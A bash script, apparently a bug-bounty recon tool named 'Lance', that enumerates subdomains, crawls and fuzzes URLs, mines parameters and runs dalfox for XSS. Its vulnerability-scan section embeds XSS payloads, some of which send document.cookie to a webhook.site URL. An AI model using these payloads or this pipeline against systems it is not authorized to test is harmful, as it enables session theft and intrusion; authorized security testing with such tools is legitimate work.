#!/bin/bash

# CONFIG
subdomains_result_fname="subdomains.txt"
urls_result_fname="urls.txt"
fuzz_result_fname="to_fuzz.txt"

lance_log_fname="lance_log.txt"
katana_log_fname="katana_log.txt"
httpx_log_fname="httpx_log.txt"
subfinder_log_fname="subfinder_log.txt"
tmp_log_fname="tmp_log.txt"

logs_dname="logs"
static_files_dname="static"
results_dname="results"

wordlist_fname="wordlist.txt"
params_fname="params.txt"
xss_payload_fname="xss.txt"
BIN="./bin"

# Default value for -rl parameter
rl_def=10
    
# BANNER
echo -e "########################################";
echo -e "#   _       ____  ____     __    ___   #";
echo -e "#  | |     /    ||    \   /  ]  /  _]  #";
echo -e "#  | |    |  o  ||  _  | /  /  /  [_   #";
echo -e "#  | |___ |     ||  |  |/  /  |    _]  #";
echo -e "#  |     ||  _  ||  |  /   \_ |   [_   #";
echo -e "#  |     ||  |  ||  |  \     ||     |  #";
echo -e "#  |_____||__|__||__|__|\____||_____|  #";
echo -e "########################################";
echo ""

# Function to display script usage
display_usage() {
    echo "Usage: $0 <scope> <out_scope> <OPTIONS>"
    echo "Example: $0 -t scope.txt -i out_scope.txt -r 10 -H 'Cookie: PHPSESSID=dGVzdAo=' -H 'User-Agent: Custom-Agent.v12.test'"
    echo ""
    echo "OPTIONS:"
    echo " -h:        <HELP>     prints this message and exit"
    echo " -t:        <TARGET>   filename with the scope of your project"
    echo " -i:        <IGNORE>   filename with out of scope domains/sub-domains"
    echo " -r:        <RATE>     rate limit for your requests"
    echo " -H:        <HEADERS>  custom headers to pass to your requests"
    echo ""
    exit 1
}

# Function to store results on files
log() {
    data=$1
    fname=$2
    save_message=$3
    tmp_path=$(get_path $tmp_log_fname)

    path=$(get_path $fname)

    # If the file does not exist then create it
    if [[ ! -f "$path" ]]; then
        echo -n "" > $path
    fi

    # Always store only unique values
    echo $data | tr " " "\n" | grep -E "[A-Za-z0-9]+" >> $path
    cat $path | sort -u > $tmp_path
    cp $tmp_path $path 2>/dev/null

    # The 3rd parameter here will be save_message
    # By default we assume is True and print the message
    if [[ -z $save_message ]]; then     # True
        display_saved_message $path
    fi
}

log_clean() {
    fname=$1
    path=$(get_path $fname)

    rm -f $path 2>/dev/null
}

log_read() {
    fname=$1
    path=$(get_path $fname)

    cat $path 2>/dev/null
}

get_path() {
    fname=$1
    # Check in wich directory the file should be saved
    if [[ $(echo $fname | grep "log") ]]; then
        echo "$logs_dname/$fname"
    else
        echo "$results_dname/$fname"
    fi
}

display_saved_message() {
    echo "[!] Saved to:"
    echo "$(pwd)/$1"
}

display_empty_scope_message() {
    echo -e "${red}[-]${white} Scope is empty."
    echo -e "${red}[-]${white} Exiting..."
    display_usage
}

# Colors
red="\033[0;31m"
green="\033[1;32m"
white="\033[0m"
blue='\033[0;34m'

# Reset variables
headers=""
scope_fname=""
out_scope_fname=""

# Start new directories
rm -rf "$static_files_dname" 2>/dev/null
rm -rf "$logs_dname" 2>/dev/null
rm -rf "$results_dname" 2>/dev/null
mkdir "$static_files_dname" 2>/dev/null
mkdir "$logs_dname" 2>/dev/null
mkdir "$results_dname" 2>/dev/null

# Parse command line options
while getopts "H:r:t:i:h" opt; do
    case ${opt} in
        H )
            cmd="$(echo "$OPTARG" | grep :)"
            if [[ ! -z $cmd ]]; then
                headers+=" -H '$OPTARG "
            else
                headers+="$OPTARG '"
            fi
        ;;
        r )
            rl="$OPTARG"
        ;;
        t )
            scope_fname="$OPTARG"
        ;;
        i )
            out_scope_fname="$OPTARG"
        ;;
        h )
            display_usage
        ;;
        \? )
            echo ""
            display_usage
            exit 2
        ;;
    esac
done
shift $((OPTIND - 1))

# Check if the required arguments are provided
if [[ -z $scope_fname ]]; then
    display_empty_scope_message
    exit 0
fi

# Check for an empty scope
cmd=$(cat "$scope_fname" | wc -l)
if [[ $cmd -lt 1 ]]; then
    display_empty_scope_message
    exit 0
fi

# If -rl parameter not provided, assign default value
if [[ -z "$rl" || ! "$rl" =~ ^[0-9]+$ ]]; then
    rl="$rl_def"
fi

# Displays the date and time
date

############################################## Subdomains Discover ##########################################
# Get wordlist
echo "[!] Checking Wordlist."
if [[ ! -f "$results_dname/$wordlist_fname" ]]; then  
    echo "[!] Downloading wordlist."
    cmd="curl -k -s https://raw.githubusercontent.com/josemlwdf/random_scripts/refs/heads/main/wordlist.txt"
    echo -e "${blue}[!]${white} $cmd"
    data=$($cmd)
    log "$data" $wordlist_fname;
fi
cmd=$(log_read $wordlist_fname | wc -l);
echo -e "${green}[+]${white} $cmd endpoints on the wordlist."

# Store scope subdomains
echo "[!] Starting new subdomains file with normalized domains/subdomains."
cmd="$(cat $scope_fname | grep -vE "\*")"
log "$cmd" $subdomains_result_fname

wildcards=$(cat $scope_fname | grep -E "\*" | sed 's|^\*\.||')
log "$wildcards" $subdomains_result_fname False

# Search for new subdomains from wildcards
echo "[!] Launching subfinder in wildcards and extracting out of scope results."
# Subfinder
cmd="$BIN/subfinder -dL $(get_path $subdomains_result_fname) -silent -nc -f $out_scope_fname -t 1000"
echo -e "${blue}[!]${white} $cmd"
data=$($cmd)
log "$data" $subfinder_log_fname;

cmd="$(log_read $subfinder_log_fname | wc -l)"
echo "[!] Probing subdomains to find live hosts."
echo -e "${green}[+]${white} $cmd new domains/subdomains to probe."

# Httpx
cmd="$BIN/httpx -sc -cl -nf -maxr 5 -title -l $(get_path $subfinder_log_fname) -no-decode -retries 1 -timeout 2 -silent -method -websocket -fr $headers"
echo -e "${blue}[!]${white} $cmd"
data=$($cmd | tr " " ">")
log "$data" $httpx_log_fname;
log_read $httpx_log_fname | tr ">" " " > $(get_path $tmp_log_fname)
log_read $tmp_log_fname > $(get_path $httpx_log_fname)

# Sort unique httpx results
# Add to our subdomains list with the new curated list of ALIVE subdomains
cmd="$(log_read $httpx_log_fname| grep -E 'http[s]*://' | awk '{print $1}' | sed 's|^http[s]*://||')"

# Report alive subdomains found
subdomains_alive_count=$(echo "$cmd" | wc -w);
echo -e "${green}[+]${white} $subdomains_alive_count subdomains alive."

if [[ $subdomains_alive_count -lt 1  ]]; then
    echo -e "${red}[+]${white} Exiting..."
    exit 0
fi

# Store alive results
log "$cmd" $subdomains_result_fname

# Implementing a "Prefer HTTPS" option
data=$(log_read $httpx_log_fname | awk '{print $1}')
for url in $data; do
    if [[ ! -z $(echo $url | grep 'https://') ]]; then
        log "$url" $urls_result_fname False
    fi
done

data=$(log_read $httpx_log_fname | awk '{print $1}' | grep 'http://')
for url in $data; do
    domain=$(echo "$url" | awk '{print $1}' | tr '/' ' ' | awk '{print $2}')
    cmd=$(log_read $urls_result_fname | grep $domain)
    if [[ -z $cmd ]]; then
        log "$url" $urls_result_fname False
    fi
done

# Select Weird/Interesting URLs from our curated list to FUZZ
data=$(log_read $httpx_log_fname | grep -E '404|403' | awk '{print $1}')
for url in $data; do
    if [[ ! -z $url ]]; then
        # Store interesting results
        log "$url" $fuzz_result_fname False
    fi
done

# Report interesting subdomains found
interesting_count=$(log_read $fuzz_result_fname | wc -l)
if [[ $interesting_count -gt 0 ]]; then
    echo -e "${green}[+]${white} $interesting_count interesting subdomains to FUZZ."
fi

# Cleanup httpx auto-generated files
rm -f resume.cfg 2>/dev/null
rm -f README.md 2>/dev/null
rm -f LICENSE.md 2>/dev/null

############################################## Subdomains Discover End ##########################################
############################################## URLs Discover ##########################################
# Crawling domains
echo "[!] Crawling hosts."
cmd="$BIN/katana -list $(get_path $urls_result_fname) -silent -nc -rl $rl -d 10 -jc -jsl -kf -timeout 2 -cs $(get_path $subdomains_result_fname) $headers"
echo -e "${blue}[!]${white} $cmd"
data=$($cmd)
log "$data" $katana_log_fname

if [[ $(log_read $fuzz_result_fname | wc -l ) -gt 0 ]]; then
    echo "[!] Crawling interesting subdomains."
    cmd="$BIN/katana -list $(get_path $fuzz_result_fname) -silent -nc -rl $rl -d 10 -jc -jsl -kf -timeout 2 -cs $(get_path $subdomains_result_fname) $headers"
    echo -e "${blue}[!]${white} $cmd"
    data=$($cmd)
    log "$data" $katana_log_fname
    log "$data" $fuzz_result_fname
fi

# Getting URLs from Wayback machine
echo "[!] Getting URLs from Wayback"
cmd=$(cat $(get_path $subdomains_result_fname) | waybackurls)
log "$cmd" $urls_result_fname

# Remove 404$
echo "[!] Proving unique URLs to remove 404"
cmd="$BIN/httpx -sc -cl -nf -maxr 5 -l $(get_path $urls_result_fname) -no-decode -retries 1 -timeout 2 -silent -nc -fr $headers"
echo -e "${blue}[!]${white} $cmd"
data=$($cmd | grep -v '404' | tr " " ">")
log "$data" $httpx_log_fname

# Cleanup httpx auto-generated files
rm -f resume.cfg 2>/dev/null
rm -f README.md 2>/dev/null
rm -f LICENSE.md 2>/dev/null

echo "[!] Removing results with 404 status code."
log_clean $tmp_log_fname
while read -r item; do
    url=$(echo $item | tr ">" " "| awk '{print $1}')
    log "$url" $tmp_log_fname False
done < $(get_path $httpx_log_fname)

# Sort unique URLs and remove parameters values
echo "[!] Normalizing parameter values to reduce duplicates."
log_clean $urls_result_fname
data=$(log_read $tmp_log_fname)
for item in $(echo "$data"); do
    if [[ ! -z $(echo "$item" | grep -E '?.*=') ]]; then
        url=$(echo "$item" | sed 's|&|\n|' | sed 's|=|\n=|' | grep -v = | tr '\n' '=' | sed 's|=|=1|g')
    else
        url=$item
    fi
    log "$url" $urls_result_fname False
done

# Extract URI paths to feed wordlist
# Extract URLs from files
echo "[!] Collecting URI paths to feed wordlist."
urls=$(grep -rEo 'https?://[^[:space:]]+')
uris=()
# Loop through each file
for url in $urls; do    
    uris+=$(echo "$url" | grep -vE 'wordlist.txt|josemlwdf|CTF.num' | sed 's|^.*://[^/]*||' | sed 's|\?.*||' | tr '/' '\n' | tr -c '[:alnum:]' '\n')
done

# Remove duplicate entries and sort the wordlist
data=$(echo "$uris" | grep -x '.\{4,\}' | grep -vE '^([0-9]+){2,}')
log "$data" $wordlist_fname

cmd="$(cat $(get_path $wordlist_fname) | wc -l)"
echo -e "${green}[+]${white} $cmd endpoints on the new wordlist."

# Feroxbuster 
echo "[!] Launching Feroxbuster."
cmd="$BIN/feroxbuster --stdin -q -f -T 2 -r -k -d 0 --rate-limit 100 --no-state --extract-links -D -s 200,403,301,302,307,308,400,405,415,423 -x php,jsp,aspx,bak -w $(get_path $wordlist_fname) $headers"
echo -e "${blue}[+]${white} $cmd"
data=$(awk '{print "http://"$0}' $(get_path $subdomains_result_fname) | $cmd | grep -vE '\.jpg|\.gif|\.css' | grep -vE '^ERR' | awk '{print $NF}')
log "$data" $urls_result_fname 

if [[ ! -z $(log_read $fuzz_result_fname) ]]; then
    data=$(log_read $fuzz_result_fname | $cmd | grep -vE '\.jpg|\.gif|\.css' | grep -vE '^ERR' | awk '{print $NF}')
    log "$data" $urls_result_fname False
fi

# Report founded URLs
cmd=$(log_read $urls_result_fname | wc -l)
echo -e "${green}[+]${white} $cmd URLs have been found in total."

############################################## URLs Discover End ##########################################
############################################## Download URLs ##########################################

ulimit -n 16384
echo "[!] Fetching URLs"
cmd="$BIN/fff $headers -o $static_files_dname -s 200 -d $(expr 1000 / $rl) --ignore-empty"
echo -e "${blue}[+]${white} $cmd"
cat "$(get_path $urls_result_fname)" | grep -vE '\.jpg|\.jpeg|\.gif|\.css|\.tif|\.tiff|\.png|\.ttf|\.woff|\.woff2|\.ico|\.pdf|\.svg|\.txt|\.xml|\.js' | $cmd 1>/dev/null 2>/dev/null
display_saved_message "$static_files_dname"

############################################## Download URLs End ##########################################
############################################## Param Mining ##########################################

# Search for params on the html
params=$(grep -oriahE 'name=\"(.*)?\" ' | awk '{print $1}' | cut -d '"' -f 2 | grep -E '^[a-zA-Z0-9]' | grep -v [[:punct:]] | sort -u)
log $params $params_fname

############################################## Param Mining End ##########################################
############################################## Vulnerability Scan ##########################################

# Store XSS Payloads to use with Dalfox
xss='<img src ="x" onerror= "confirm(Dalfox)">
#"><img src ="x" onerror= "confirm(Dalfox)">
--><img src ="x" onerror= "confirm(Dalfox)"><!--
*/=confirm(Dalfox);/*
*/=document.location.href="https://webhook.site/6cd916f2-9563-42e0-9680-d1781966b257?"+document.cookie;/*
#"><img src=/ onerror=document.location.href="https://webhook.site/6cd916f2-9563-42e0-9680-d1781966b257?"+document.cookie;>
-->#"><img src=/ onerror=document.location.href="https://webhook.site/6cd916f2-9563-42e0-9680-d1781966b257?"+document.cookie;><!--'
log $xss $xss_payload_fname

# Dalfox
echo "[!] Scanning URLs for XSS"
cmd="$BIN/dalfox pipe --timeout 2 --no-color --poc-type='curl' -o $(get_path $dalfox_log_fname) --silence --delay $(expr 1000 / $rl) --no-spinner --har-file-path $(get_path $tmp_log_fname) --ignore-return 301,302,403,404 -w 1000 --mass -p $(cat $(get_path $params_fname) | tr '\n' ',') --only-custom-payload --custom-payload $(get_path $xss_payload_fname)"
echo -e "${blue}[+]${white} $cmd"
data="$(cat $(get_path $urls_result_fname)| grep -vE '\.jpg|\.jpeg|\.gif|\.css|\.tif|\.tiff|\.png|\.ttf|\.woff|\.woff2|\.ico|\.pdf|\.svg|\.txt|\.xml|\.js' | grep -E '\?.*=' | $cmd 2>/dev/null)"

############################################## Vulnerability Scan End ##########################################

echo -e "${blue}[*] Happy Hunting${white}"

# Displays the date and time
date